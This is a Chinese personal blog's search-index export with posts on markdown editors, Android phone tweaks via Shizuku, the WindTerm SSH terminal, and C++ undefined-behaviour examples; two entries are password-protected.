id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>一般不至于出现这个小错误，发布者肯定要打包这些不常用的dll。</p><p>如果你的同学或者朋友电脑上有，其实叫他用everything找出来发给你是最好的，毕竟自己在第三方的网站上可能不放心</p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MFC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文章加密测试</title>
      <link href="/2022/10/01/%E5%8A%A0%E5%AF%86%E6%B5%8B%E8%AF%95/"/>
      <url>/2022/10/01/%E5%8A%A0%E5%AF%86%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="c13b0680545678797f70731ca8d133f675079fbe37487416fd46396965ab65f2"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 加密文章 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【软件】仨markdown软件</title>
      <link href="/2022/09/24/markdownApp/"/>
      <url>/2022/09/24/markdownApp/</url>
      
        <content type="html"><![CDATA[<p>常见的有</p><ul><li>typora——现在出了正式版要收费</li><li>vscode——正在用，但是预览起来麻烦而且好像没啥智能提示</li><li>marktext——开源的，尝试了一下</li></ul><span id="more"></span><hr><h1 id="比较草率"><a href="#比较草率" class="headerlink" title="比较草率"></a>比较草率</h1><p>重点是在marktext上</p><hr><h2 id="1-typora"><a href="#1-typora" class="headerlink" title="1.typora"></a>1.typora</h2><p>这个挺好用的，至少在原生写md方面不错，但也如标题所示，正式版收费了，虽然网上应该也有那啥的。</p><img src="/2022/09/24/markdownApp/003.png" class=""><p>值得依赖的就是本身的ui和快捷键</p><h3 id="1-1-主题"><a href="#1-1-主题" class="headerlink" title="1.1 主题"></a>1.1 主题</h3><p><a href="https://theme.typora.io/">typora主题地址</a></p><p>在typora路径下有个themes文件夹，你找到合适的就可以下载过来然后解压，如果没有额外的内容跟.css匹配，就直接把解压目录下的.css文件copy到<code>typora/themes</code>下面就行</p><p>类似我这样：</p><img src="/2022/09/24/markdownApp/004.png" class=""><h3 id="1-2-常用快捷键"><a href="#1-2-常用快捷键" class="headerlink" title="1.2 常用快捷键"></a>1.2 常用快捷键</h3><ul><li>加粗： <code>Ctrl + B</code></li><li>标题： <code>Ctrl + H</code></li><li>插入链接： <code>Ctrl + K</code></li><li>字体倾斜：<code>Ctrl+I</code></li><li>下划线:<code>Ctrl+U</code></li><li>返回Typora顶部：<code>Ctrl+Home</code></li><li>返回Typora底部：<code>Ctrl+End</code></li><li>创建表格：<code>Ctrl+T</code></li><li>创建超链接:<code>Ctrl+K</code></li><li>搜索:<code>Ctrl+F</code></li><li>选中某句话:<code>Ctrl+L</code></li><li>选中某个单词:<code>Ctrl+D</code></li><li>选中相同格式的文字：<code>Ctrl+E</code></li><li>搜索并替换：<code>Ctrl+H</code></li><li>删除线：<code>Alt+Shift+5</code></li><li>插入图片：<code>Ctrl+Shift+I</code></li><li>引用：<code>Ctrl+Shift+Q</code></li><li>公式块:<code>Ctrl+Shift+M</code></li></ul><blockquote><p>优点：支持中文、ui也还行、最早用的就是这个<br>不舒服的地方，就是转换成html的适合typora的格式行间距有点离谱，多一行的。</p></blockquote><hr><h2 id="2-vscode"><a href="#2-vscode" class="headerlink" title="2.vscode"></a>2.vscode</h2><p>这玩意怎么说呢，就是个水桶，啥都可以装，但是纯度不高。<br>他也有大量markdown的插件，根据百度自行查找。</p><p>为什么用他呢，主要还是因为个人博客可能要用到html的部分，在vscode上比较习惯吧。</p><h3 id="2-1-vscode主题"><a href="#2-1-vscode主题" class="headerlink" title="2.1 vscode主题"></a>2.1 vscode主题</h3><p>这个不用多说了吧，挺简单的，网上搜一下，自带拓展下载的接口，下完设置里面替换就行了。</p><h3 id="2-2-快捷键"><a href="#2-2-快捷键" class="headerlink" title="2.2 快捷键"></a>2.2 快捷键</h3><p>这个比较常规，一般都通用。</p><h3 id="2-3-推荐markdown拓展"><a href="#2-3-推荐markdown拓展" class="headerlink" title="2.3 推荐markdown拓展"></a>2.3 推荐markdown拓展</h3><p><code>markdown all in one</code> —— 号称集成快捷键和一些功能，需要自己学习一下，我大致都知道源代码该怎么写就不怎么用了，但是会快捷键确实提升效率</p><p><code>markdown Preview Enhanced</code> —— 将预览界面背景调成白色，默认跟code主题一样<br>效果如图</p><img src="/2022/09/24/markdownApp/005.png" class=""><p><code>markdown Preview  Github Styling</code> —— 将预览界面风格改为github，可下可不下吧，如果是经常写readme.md这种还是有点用的，但是对于博客渲染来说一般般，因为博客自己有样式表渲染。<br><code>markdownlint</code> —— 这个我比较讨厌说实在，虽然是markdown的规范。。但是一堆高亮看着真不爽</p><blockquote><p>优点：水桶王<br>缺点：刚转过来可能不习惯吧，一股子源码风，但是谁叫hexo主题自有一套渲染</p></blockquote><hr><h2 id="3-marktext"><a href="#3-marktext" class="headerlink" title="3.marktext"></a>3.marktext</h2><p><strong>注意：可能需要科学工具有点慢</strong></p><p><a href="https://github.com/marktext/marktext#download-and-installation">marktext地址</a><br>是一个开源项目。</p><p>介绍里windows的下载有两种方式<br>Windows<br>Simply download and install MarkText via setup wizard (marktext-setup-%version%.exe) and choose whether to install per-user or machine wide. Alternatively, install MarkText using a package manager such as Chocolatey or Winget.</p><p>To use Chocolatey, you need to have Chocolatey installed:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">choco install marktext</span><br></pre></td></tr></table></figure><p>To use Winget, you need to have Winget installed:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winget install marktext</span><br></pre></td></tr></table></figure><p>我用powershell下载的时候第一种老是超时[不知道是不是上科技会好一点]，后面就选第二种了，虽然这个速度也是真的慢的离谱</p><img src="/2022/09/24/markdownApp/000.png" class=""><p>足足等了个把小时吧。。哪怕是下源文件自己编译出来也好，这个仓库传过来忒慢了</p><hr><h3 id="marktext快捷键"><a href="#marktext快捷键" class="headerlink" title="marktext快捷键"></a>marktext快捷键</h3><blockquote><p>应该跟typora类似吧，毕竟一部分是系统快捷键</p></blockquote><table><thead><tr><th>⽂件</th><th></th></tr></thead><tbody><tr><td>新窗⼝</td><td>Ctrl+N</td></tr><tr><td>保存</td><td>Ctrl+S</td></tr><tr><td>粘贴纯⽂本</td><td>Ctrl+Shift+V</td></tr><tr><td>查找</td><td>Ctrl+F</td></tr><tr><td>关闭窗⼝</td><td>Ctrl+W</td></tr><tr><td>关闭选项卡</td><td>Ctrl+Shift+W</td></tr><tr><td>源代码模式</td><td>Alt+Ctrl+S</td></tr><tr><td>打字机模式</td><td>Alt+Ctrl+T</td></tr><tr><td>聚焦模式</td><td>Ctrl+Shift+J</td></tr><tr><td>侧边栏</td><td>Ctrl+J</td></tr><tr><td>显⽰标签栏</td><td>Alt+Ctrl+B</td></tr></tbody></table><table><thead><tr><th>⽂本</th><th></th></tr></thead><tbody><tr><td>标题</td><td>Ctrl+[1-6]</td></tr><tr><td>表格</td><td>Ctrl+Shift+T</td></tr><tr><td>列表</td><td>-</td></tr><tr><td>有序列表</td><td>1.</td></tr><tr><td>切换列表类型</td><td>Alt+Ctrl+U</td></tr><tr><td>列表紧凑模式</td><td>Alt+Ctrl+L</td></tr><tr><td>引⽤</td><td><code>&amp;gt;</code></td></tr><tr><td>代码块</td><td>Alt+Ctrl+C</td></tr><tr><td>分割线</td><td>***</td></tr><tr><td>图像</td><td>Ctrl+Shift+I</td></tr><tr><td>超链接</td><td>Ctrl+L</td></tr><tr><td>删除线</td><td>Ctrl+D</td></tr><tr><td>清除格式</td><td>Ctrl+Shift+I</td></tr><tr><td>⾼亮</td><td>Ctrl+Shift+H</td></tr><tr><td>标签</td><td>Ctrl+&#96;</td></tr></tbody></table><hr><h3 id="marktext试用"><a href="#marktext试用" class="headerlink" title="marktext试用"></a>marktext试用</h3><p>ui确实还行<br>不过默认语言是英语，<img src="/2022/09/24/markdownApp/002.png" class=""><br>想要改成中文好像不是直接就可以改的算是个小问题，对于英文不好的真的有点麻烦吧，网上也有教怎么改，自行<a href="https://www.baidu.com/">百度</a></p><img src="/2022/09/24/markdownApp/001.png" class=""><hr><p>说到底人还是存在一点点偏执，有的时候第一个用到的软件只要别太差，基本都不会说什么。typora这个也是我最早使用的，只不过那会倒不用参杂html的成分，所以比较自然，但是现在到了收费阶段，虽然我是白嫖用户~</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>习惯用哪个都行，如果单纯的编写md，带实时预览的都比vscode插件打开要好很多。<br>但是用于博客的话其实都差不多，毕竟最后转换成html，ui还是看这个博客主题的，你还要参杂html的代码，还是vsocde这样源代码风格合适一点，就是效率有点搞</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>给爪机上点科技</title>
      <link href="/2022/09/16/phoneTest/"/>
      <url>/2022/09/16/phoneTest/</url>
      
        <content type="html"><![CDATA[<h1 id="u1s1，爪机配火龙三八夏天真的遭不住"><a href="#u1s1，爪机配火龙三八夏天真的遭不住" class="headerlink" title="u1s1，爪机配火龙三八夏天真的遭不住"></a>u1s1，爪机配火龙三八夏天真的遭不住</h1><p>原本打算root掉，但是有些数据太多懒得备份了，重新下和导入导出太费时间。</p><ul><li>phone：Xiaomi 11u</li><li>system：miui 13</li><li>12+256&#x2F;意义不大</li></ul><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><ol><li>火龙三八发热量惊人。。手机温度一高就卡起来掉帧还掉电</li><li>相机也是个坑，过热会打不开，有的时候打开黑屏</li></ol><p>sou不了啊，root虽然看上去效果好但是懒得弄<br>之前在酷安上看到shizuku+小黑屋的方法，可以稍微减少点负担。不过也不治本。</p><blockquote><p>ps：如果没有科学上网，软件就只能自己酷安慢慢找包了</p></blockquote><hr><h2 id="shizuku"><a href="#shizuku" class="headerlink" title="shizuku"></a>shizuku</h2><p><a href="https://shizuku.rikka.app/zh-hans/guide/setup/">文档戳此处</a></p><p>我所使用的时无线调试启动<br><strong>注意：没有root的手机只能用无线调试或者电脑连接adb，这两种方法在手机重启后均会失效</strong></p><p>具体的跟着步骤来就行</p><p>还有一点下面的常见问题有写，就是输入配对码的时候直接提示失败，需要你去修改一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通过无线调试启动：点击“输入配对码”后立刻提示失败</span><br><span class="line">MIUI（小米）</span><br><span class="line">在系统设置的“通知管理”-“通知显示设置”将通知样式切换为“原生样式”。</span><br></pre></td></tr></table></figure><p><strong>同时锁定后台，允许自启动，省电策略选择无设置，不然没法提权</strong></p><p>最后样式类似这样</p><img src="/2022/09/16/phoneTest/000.jpg" class=""><p>已授权一个应用是后面要说的小黑屋</p><hr><h2 id="小黑屋"><a href="#小黑屋" class="headerlink" title="小黑屋"></a>小黑屋</h2><p>同样的下载没有科学上网的前提大概率还是上酷安找包好了。</p><p>小黑屋没有什么需要搞的，因为弄完shizuku基本都配置好了，记得在shizuku给小黑屋权限，不然没法冻结app。</p><p>详细的列表也还是建议b站或者酷安参考，因为我也只参考了一部分，有些东西不确定的前提下还是留着吧</p><hr><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><p>平常发热是没这么高了，而且内存全部清空的时候剩余内存也比之前多，说明有些系统组件是真的没啥用，硬堆叠。。。</p><p>省电具体感知要看情况了，至少目前这两天没有感觉明显掉帧吧。【用了一年了手机电池好像也不咋地了】<br>而且我后台还挂着一个zeep life，就是小米运动改版，毕竟连这个手环。所以相对而言也还是再跑电。</p><p>只要别烫别乱掉帧咋样都行。</p><hr><h2 id="用了一段时间的体会"><a href="#用了一段时间的体会" class="headerlink" title="用了一段时间的体会"></a>用了一段时间的体会</h2><p>可能是用了一年多了，电池本身也掉电。<br>加上系统调度并不是很合理，还是堆叠的太多。<br>cpu是原罪，这发热量只配在冬天苟活</p><hr><h2 id="卒"><a href="#卒" class="headerlink" title="卒"></a>卒</h2><p>22.10.07 命中有此一劫，烧wifi了<br>22.10.08 送去寄修了<br>22.10.09 鉴定完免费修，等待寄回<br>22.10.11 到手，多了半年保修希望别整活</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>并非教程，只是简单记录，教程不如b站搜看视频来的直接~</p><p><a href="https://www.bilibili.com/">哔哩哔哩</a><br><a href="https://www.baidu.com/">百度</a><br><a href="https://cn.bing.com/">bing</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> phone </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>远控笔记</title>
      <link href="/2022/09/15/%E8%BF%9C%E6%8E%A7%E9%97%AE%E9%A2%98%E9%9B%86/"/>
      <url>/2022/09/15/%E8%BF%9C%E6%8E%A7%E9%97%AE%E9%A2%98%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="2c8ceb4a7b5790dcc002b25b1fda9a5d36365c73e7255fba6c781a879318553b"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 加密文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MFC </tag>
            
            <tag> Windows </tag>
            
            <tag> RemoteControl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件】WindTerm</title>
      <link href="/2022/08/28/WindTerm/"/>
      <url>/2022/08/28/WindTerm/</url>
      
        <content type="html"><![CDATA[<p>新·终端开源神器</p><ul><li><a href="https://github.com/kingToolbox/WindTerm">WindTerm</a></li><li><a href="https://github.com/kingToolbox/WindTerm/releases">WindTerm&#x2F;releases</a></li></ul><p>下载解压出来就可以使用了。</p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最早的时候连接多个虚拟机或者交换机，用的都是<a href="https://baike.baidu.com/item/Xshell/5659054?fr=aladdin">xshell</a>之类的。<br>这类软件所使用的连接协议均为SSH&#x2F;Telnet，当然还有com口的连接，那些比较老了有点。<br>除此之外还有文件传输协议FTP，貌似也有封装过的FTP。</p><p>软件嘛，ui是吸引人的第一步，功能是留住用户的第二步，开源是留住全人类的一大步。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="1-ui展示"><a href="#1-ui展示" class="headerlink" title="1. ui展示"></a>1. ui展示</h2><p>直接顺走GitHub的图。</p><p>Main Window (zsh):</p><img src="/2022/08/28/WindTerm/WindTerm.png" class=""><p>Split views:</p><img src="/2022/08/28/WindTerm/SplitView.png" class=""><p>DigeWhite Theme:</p><img src="/2022/08/28/WindTerm/WindTerm_DigeWhite_Theme.png" class=""><blockquote><p>支持zsh，这玩意怎么说呢，配合ohmyzsh，然后主题powerlevelp10k好像是，可以把这个sh整的花里胡哨的哈哈</p></blockquote><hr><h2 id="2-性能"><a href="#2-性能" class="headerlink" title="2. 性能"></a>2. 性能</h2><img src="/2022/08/28/WindTerm/000.png" class=""><p>作者很直白的举例了各个软件直接的差距</p><img src="/2022/08/28/WindTerm/001.png" class=""><p>而且正式版的软件体积大小只有三十多兆，更是支持跨平台。</p><hr><h2 id="3-上手"><a href="#3-上手" class="headerlink" title="3. 上手"></a>3. 上手</h2><img src="/2022/08/28/WindTerm/002.png" class=""><p>刚打开是的时候会选择缓存的目录，直接放到软件目录也行，放到用户目录也ok。</p><p>点击此处可以新建会话也可以在菜单栏里面选择会话，然后新建会话。</p><img src="/2022/08/28/WindTerm/003.png" class=""><p>打开新建会话之后便是这个窗口，这个窗口不能缩放有点尴尬。</p><img src="/2022/08/28/WindTerm/004.png" class=""><p>在主机处输入ip地址，可以在前面加用户，<code>username@xxx.xxx.xxx.xxx</code>，这个反正到时候连接也会有提示用户名。<br>端口固定<br>标签&#x2F;分组可加可不加<br>终端看了下应该是这个颜色比较多吧<br>字符集肯定都是以utf-8为主，Linux而言。<br>描述这个也没法拖动大小比较不爽。</p><p>如果你想让界面看着更简洁一些，可以把不需要的区域关闭</p><img src="/2022/08/28/WindTerm/005.png" class=""><p>直接点击<code>x</code>就行。</p><hr><h3 id="3-1-全局配置"><a href="#3-1-全局配置" class="headerlink" title="3.1 全局配置"></a>3.1 全局配置</h3><blockquote><p>菜单栏选择会话——选择首选项&#x2F;设置</p></blockquote><img src="/2022/08/28/WindTerm/006.png" class=""><p>比如这个启动里，我们不需要打开会话，就选择第一个无会话。也可以指定。</p><p>或者修改此处右击功能，如果不习惯快捷键拷贝黏贴这也是一个解决办法。</p><img src="/2022/08/28/WindTerm/007.png" class=""><p>还有就是这个悬停激活，感觉大部分人用不到吧，可以关了。</p><img src="/2022/08/28/WindTerm/008.png" class=""><p>文件管理器显示隐藏文件还是有点用的</p><blockquote><p>隐藏文件就是以.开头的文件或目录，这点学过linux的比较清楚</p></blockquote><img src="/2022/08/28/WindTerm/010.png" class=""><hr><h3 id="3-2-连接wsl"><a href="#3-2-连接wsl" class="headerlink" title="3.2 连接wsl"></a>3.2 连接wsl</h3><img src="/2022/08/28/WindTerm/009.png" class=""><p>连接本机的wsl，在右边的shell session中可以直接选择。<br>不需要额外配置，毕竟是本机的东西了。</p><p>默认Ubuntu用的是bash。一些常规的快捷方式它都能显示出来还是很友好的。</p><img src="/2022/08/28/WindTerm/011.png" class=""><blockquote><p>当然对于本机上cmd&#x2F;powershell&#x2F;wsl 不想出现很多个窗口也是有办法的。<br>微软商店有一个软件叫windows terminal，中文叫终端好像也挺好用的。<br>当然这是针对本地的。</p></blockquote><hr><h3 id="3-3-连接虚拟机"><a href="#3-3-连接虚拟机" class="headerlink" title="3.3 连接虚拟机"></a>3.3 连接虚拟机</h3><p>打开虚拟机，打开已经安装好的linux或者其它系统。</p><blockquote><p>ip a 看下地址先</p></blockquote><p>然后确保ssh服务安装并启动</p><blockquote><p>systemctl status ssh &#x2F;&#x2F;如果是不是running的状态就请<br>systemctl start ssh &#x2F;&#x2F;启动服务</p></blockquote><p>如果没安装<br>Debian系列的：<code>sudo apt install ssh</code><br>RedHat系列的：<code>sudo yum install ssh</code><br>可能个别的ssh有区别应该会有提示的。</p><p>新建会话</p><img src="/2022/08/28/WindTerm/012.png" class=""><p>主机那不加用户名到时候连接反正还要输，加了也就是不用改了偷个懒。</p><img src="/2022/08/28/WindTerm/013.png" class=""><p>此处输入用户密码，kali虚拟机默认都是<code>kali kali</code></p><p>成功连接</p><img src="/2022/08/28/WindTerm/014.png" class=""><p>可以看到kali自带的zsh被很好的渲染出来了。那么后期要改这玩意也没啥事。</p><hr><h3 id="3-4-传输文件"><a href="#3-4-传输文件" class="headerlink" title="3.4 传输文件"></a>3.4 传输文件</h3><p>xshell我记得是分离的。<br>windterm是集成的很好用。</p><blockquote><p>基于SFTP</p></blockquote><p>你可以选择上传</p><img src="/2022/08/28/WindTerm/015.png" class=""><p>也可以直接拖动文件到这里她会有提示的。<br>并且传输完成后还有进度显示。</p><img src="/2022/08/28/WindTerm/016.png" class=""><p>如果想直接在ssh会话窗口上传，好像需要安装别的工具，听说过一个<code>lrzsz</code><br>但我目前没这个需求。<br>也是根据linux分类<br>ReadHat就是<code>yum install lrzsz</code><br>Debian就是<code>apt install lrzsz</code><br>权限不够就加<code>sudo</code>提权。</p><hr><h2 id="4-锁屏密码"><a href="#4-锁屏密码" class="headerlink" title="4.锁屏密码"></a>4.锁屏密码</h2><p>默认30分钟没有操作，软件自身会锁屏。</p><blockquote><p>默认是空密码不用担心，直接回车就解锁了。</p></blockquote><p>如果你提示密码错误。<br>请先找到配置文件<code>.wind</code>，这个我们第一次打开软件的时候就说过。<br><code>.wind\profiles\default.v10</code>下有个user.config，如果里面有<code>application.fingerprint</code>和<code>application.masterPassword</code>干掉就行。</p><p>然后<code> .wind/profiles/default.v10/terminal/user.sessions</code>，里面如果有session.autoLogin就把著密码设为空的字符串。<br>之后选择更改著密码，旧密码是空的，新密码自己看着来。</p><hr><h2 id="5-主题"><a href="#5-主题" class="headerlink" title="5.主题"></a>5.主题</h2><p>软件的自带主题对我来说足够了，我后面只需要动动zsh就行</p><img src="/2022/08/28/WindTerm/017.png" class=""><hr><h2 id="6-x11"><a href="#6-x11" class="headerlink" title="6.x11"></a>6.x11</h2><p>这个怎么说呢，wsl2我知道是可以运行图形化的。<br>WinTerm据说集成了VcXsrv，但是我目前没有什么可以尝试。<br>对这方面有需求的可以自行百度，后期用到了我可能会加上。</p><hr><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>还有很多值得自己探索一番。</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>UB未定义行为</title>
      <link href="/2022/08/24/undefinedbehaviour/"/>
      <url>/2022/08/24/undefinedbehaviour/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>额。。惭愧，今天在群里听到UB，我还以为是啥咋没听过。</p><p>UB:<code>undefined behaviour</code>，简称：<code>未定义行为</code>。<br>不过u1s1啊。undefined，这个经常见，所以一听就知道，组合词确实是我孤陋寡闻了。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><img src="/2022/08/24/undefinedbehaviour/000.png" class=""><p>这是当时群里的题</p><p>不过借此，也可以适当进一步了解未定义行为。</p><p>首先，未定义行为怎么来的？也不合适，应该是先考虑定义。<br>所谓的语言标准，自然有自己的标准委员会提出，也就是c++ iso的说法，即c++11、c++14巴拉巴拉的，除去这一层，不同的编译器也可能自己做了优化，又多了一层定义。那么这层定义就比较搞了，因为相同的代码在不同编译器下就很有可能出问题。所以尽量不要再这上面钻牛角尖。</p><blockquote><p>未定义行为：可以说是语言标准没有规定，编译器自行决定的行为，而且在不同的编译器上有时会有不同的结果。</p></blockquote><hr><h2 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h2><p>就是很无聊的++问题</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">i = i++;</span><br></pre></td></tr></table></figure><p>在我们的印象里，后置递增，先操作后自增。即<code>i=i; i++</code><br>但是还有一种恶心的情况，<code>i++; i=i </code></p><p>当然这里能想到后者就完犊子了，肯定是先赋值后递增，所以i&#x3D;1</p><p>然后就来了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">i = i+++j;</span><br></pre></td></tr></table></figure><p>问？正常情况下你觉得是<code>i=(i++)+j</code>还是<code>i=i+(++j)</code></p><p>让我们瞅瞅vs的反汇编</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00007FF72C6A1E22  mov         eax,dword ptr [j]  </span><br><span class="line">00007FF72C6A1E25  mov         ecx,dword ptr [i]  </span><br><span class="line">00007FF72C6A1E28  add         ecx,eax  </span><br><span class="line">00007FF72C6A1E2A  mov         eax,ecx  </span><br><span class="line">00007FF72C6A1E2C  mov         dword ptr [i],eax  </span><br><span class="line">00007FF72C6A1E2F  mov         eax,dword ptr [i]  </span><br><span class="line">00007FF72C6A1E32  inc         eax  </span><br><span class="line">00007FF72C6A1E34  mov         dword ptr [i],eax </span><br></pre></td></tr></table></figure><blockquote><p>汇编指令inc 是让操作数+1</p></blockquote><p>首先把j的值传给eax，把i的值传给ecx，然后ecx+eax，再把ecx的值传给eax，也就是i+j，<br>然后把eax的值传回给变量i，变量i的值又传给eax，然后eax 完成inc，也就是自增，最后再把eax的值传回变量i。也就是后面的自增。</p><p>显然在vs中，<code>i = (i++)+j</code>。</p><p><strong>tips：这里其实也有个小坑，就是运算符优先级，他会优先处理掉高等级的，所以在有的时候你不要去让编译器考虑优先级，你应该加括号自己先预演好优先级</strong></p><p>还有一种吊炸天的问题</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">i = i+++++j;</span><br><span class="line">std::cout &lt;&lt; i;</span><br></pre></td></tr></table></figure><p>你说是<code>i+ (++(++j))</code>还是<code>i++ + ++j</code><br>很无厘头啊，虽然现在的vs会要求你有格式控制，一整串他是不认账的。</p><p>但是你要放在试卷上，就是铁nt行为。</p><p>像已知的，gcc、msvc、clang他们的支持就有区别了。<br>这种无厘头的说实在没有必要太纠结，开发这么写要给打死。<br>也别只拿vs的反汇编说话，虽然能给出一个答案，但是不管从什么角度而言这种题目都很反人类。</p><hr><h2 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h2><p>标准定义，常量是在初始化也可以说定义后是不能被修改的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> *b = (<span class="type">int</span>*)&amp;a;</span><br><span class="line">*b = <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>那么a的值？</p><p>在iso硬性规定常量不能被修改，因为常量被当成右值了。<br>当我们强制转换成整型指针然后取他的地址。就变相的控制了</p><p>很显然这也是未定义行为，不过有些时候还真有这么用的，但是不太好。毕竟万一常量释放了，这个指针又不知道搞哪去了。</p><hr><h2 id="例三"><a href="#例三" class="headerlink" title="例三"></a>例三</h2><p>就是重复释放</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>;</span><br><span class="line"><span class="keyword">delete</span> p;</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> p;</span><br></pre></td></tr></table></figure><p>编译器不会报错，但不能保证会不会出现别的结果。</p><hr><h2 id="总而言之"><a href="#总而言之" class="headerlink" title="总而言之"></a>总而言之</h2><p>我所知道的都是比较浅薄的，百度一搜都有很多高端的东西，像是容器+算法然后整的活。可能这才是真正的程序员吧，还要翻阅文献什么的确实太顶了。。<br>严格意义上，未定义行为不算一个详细的知识体系，你不可能记住所有的未定义行为吧。。。毕竟是叫未定义啊，有些指不定还是你整的活。</p><p>常见的反正就是那么几种</p><ol><li>有符号类型赋值的时候超出范围</li><li>函数体之间忘记初始化之类的</li><li>算术表达式写的不好就会产生未定义的结果</li><li>数学性质除以0</li><li>经典溢出，有的时候溢出是不一定会报错的</li></ol><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>坦白的说，还不够深入了解<br>但是一码归一码，像这种未定义行为可能还是因为c&#x2F;c++比较自由<br>还得努力学啊~~~感觉自己就是废物</p>]]></content>
      
      
